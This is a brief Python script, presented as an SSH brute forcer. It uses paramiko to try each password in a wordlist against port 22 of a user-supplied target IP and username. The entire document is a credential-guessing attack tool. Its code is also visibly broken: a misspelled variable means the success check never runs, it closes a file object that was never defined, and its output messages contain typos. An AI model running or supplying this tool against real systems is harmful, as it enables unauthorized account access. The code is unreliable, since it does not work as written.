# SSH Brute Forcer Script

import paramiko,sys,os

#Inputs from the user; alternatively could utilize "sys.argv[]" to accept user input from CLI
target = str(input('Please enter target IP address: '))
username = str(input('Please enter username to bruteforce: '))
password_file = str(input('Please enter location of the password file: '))

#Function for "ssh_connect". Successfull auth will return code 0, failed return code 1.
def ssh_connect(password, code=0):
	ssh = paramiko.SSHClient()
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

	try:
		ssh.connect(target, port=22, username=username, password=password)
	except paramiko.AuthenticationException:
		code = 1
	ssh.close()
	return code

#Password list supplied, loop takes each line in wordlist to try
with open(password_file, 'r') as file:
	for line in file.readlines():
		password = line.strip()

		#The script tries SSH connection, and decided based on Paramiko response code returned.
		try:
			respone = ssh_connect(password)

			if response == 0:
				print('password fpound: '+ password)
			elif response == 1:
				print('no luck')
		except Exception as e:
			print(e)
		pass 

input_file.close()